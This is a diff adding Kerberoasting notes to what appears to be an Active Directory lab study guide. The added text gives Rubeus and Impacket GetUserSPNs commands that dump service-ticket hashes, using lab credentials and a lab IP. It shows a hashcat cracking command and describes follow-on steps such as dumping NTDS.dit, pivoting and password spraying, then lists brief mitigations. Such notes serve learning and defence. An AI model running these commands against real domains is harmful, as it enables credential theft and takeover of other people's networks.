@@ -56,4 +56,36 @@ Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs 
 # Kerberoasting w/ Rubeus & Impacket
 - Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password
 - If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is
-- To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable account
+- To enumerate Kerberoastable accounts use BloodHound to find all Kerberoastable account
+```
+Kerberoasting w/ Rubeus - 
+
+1.) cd Downloads - navigate to the directory Rubeus is in
+
+2.) Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users
+```
+- copy the 2 hashes
+```
+hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash ---- > MYPassword123#
+```
+
+```
+Kerberoasting w/ Impacket - 
+
+1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located
+
+2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.138.185 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
+
+3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
+```
+
+- What Can a Service Account do?
+  - After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not
+  - If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit
+  - If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts
+
+- Kerberoasting Mitigation
+  - Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
+  - Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.
+
+# AS-REP Roasting w/ Rubeus
